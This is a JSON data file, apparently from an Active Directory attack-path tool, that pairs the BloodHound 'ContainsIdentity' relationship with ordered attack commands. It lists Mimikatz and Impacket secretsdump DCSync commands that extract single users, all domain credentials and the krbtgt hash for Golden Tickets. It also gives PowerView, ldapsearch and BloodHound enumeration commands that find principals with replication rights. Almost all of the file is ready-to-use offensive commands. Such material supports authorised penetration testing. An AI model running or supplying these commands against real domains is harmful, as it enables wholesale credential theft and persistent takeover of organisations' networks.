{
    "ContainsIdentity": {
        "meaning": "The ContainsIdentity relationship represents how an AD domain contains the identity of an AD account (user or computer). Control over the domain object enables an attacker to compromise all accounts of the domain through DCSync, AllExtendedRights, or GenericAll permissions on the domain object.",
        "common": "",
        "windows": {
            "DCSync_Attack": [
                {
                    "order": 1,
                    "command": "lsadump::dcsync /domain:domain.com /user:DOMAIN\\targetuser",
                    "description": "Perform DCSync attack using domain-level permissions to extract user credentials"
                },
                {
                    "order": 2,
                    "command": "lsadump::dcsync /domain:domain.com /all",
                    "description": "Extract all domain credentials using DCSync with domain control"
                },
                {
                    "order": 3,
                    "command": "lsadump::dcsync /domain:domain.com /user:krbtgt",
                    "description": "Extract krbtgt account hash for Golden Ticket creation"
                }
            ],
            "Domain_Enumeration": [
                {
                    "order": 1,
                    "command": "Get-DomainUser -Domain domain.com",
                    "description": "Enumerate all users in the domain using PowerView"
                },
                {
                    "order": 2,
                    "command": "Get-DomainComputer -Domain domain.com",
                    "description": "Enumerate all computers in the domain"
                },
                {
                    "order": 3,
                    "command": "Get-DomainObjectAcl -SearchBase \"DC=domain,DC=com\" -ResolveGUIDs",
                    "description": "Examine domain-level ACL permissions for abuse opportunities"
                }
            ],
            "Domain_Control_Verification": [
                {
                    "order": 1,
                    "command": "Get-ObjectAcl -SamAccountName \"Domain Admins\" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"}",
                    "description": "Verify GenericAll permissions on domain for credential extraction"
                },
                {
                    "order": 2,
                    "command": "Get-DomainObjectAcl -SearchBase \"DC=domain,DC=com\" | ? {$_.ObjectAceType -eq \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\"}",
                    "description": "Check for DS-Replication-Get-Changes-All extended right"
                },
                {
                    "order": 3,
                    "command": "# Use domain control to access any contained identity",
                    "description": "Leverage domain-level permissions to compromise any account identity"
                }
            ]
        },
        "linux": {
            "Impacket_DCSync": [
                {
                    "order": 1,
                    "command": "secretsdump.py domain/user:password@dc.domain.com -just-dc-user targetuser",
                    "description": "Extract specific user credentials using DCSync via Impacket"
                },
                {
                    "order": 2,
                    "command": "secretsdump.py domain/user:password@dc.domain.com -just-dc",
                    "description": "Extract all domain credentials using domain-level permissions"
                },
                {
                    "order": 3,
                    "command": "secretsdump.py domain/user:password@dc.domain.com -just-dc-user krbtgt",
                    "description": "Extract krbtgt hash for Golden Ticket attacks"
                }
            ],
            "LDAP_Domain_Analysis": [
                {
                    "order": 1,
                    "command": "ldapsearch -x -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -b 'DC=domain,DC=com' '(objectClass=user)' sAMAccountName",
                    "description": "Enumerate all user identities contained in the domain"
                },
                {
                    "order": 2,
                    "command": "ldapsearch -x -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -b 'DC=domain,DC=com' '(objectClass=computer)' dNSHostName",
                    "description": "Enumerate all computer identities in the domain"
                },
                {
                    "order": 3,
                    "command": "ldapsearch -x -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -b 'DC=domain,DC=com' nTSecurityDescriptor",
                    "description": "Examine domain security descriptor for control permissions"
                }
            ],
            "BloodHound_Domain_Analysis": [
                {
                    "order": 1,
                    "command": "python3 bloodhound.py -u user@domain.com -p password -d domain.com -dc dc.domain.com -c All",
                    "description": "Collect comprehensive domain identity and relationship data"
                },
                {
                    "order": 2,
                    "command": "# Cypher: MATCH (d:Domain)-[:ContainsIdentity]->(n) WHERE d.name = 'DOMAIN.COM' RETURN n",
                    "description": "Query all identities contained within the target domain"
                },
                {
                    "order": 3,
                    "command": "# Cypher: MATCH (n)-[:DCSync|:AllExtendedRights|:GenericAll]->(d:Domain) RETURN n,d",
                    "description": "Find principals with domain-level control permissions"
                }
            ]
        }
    }
}
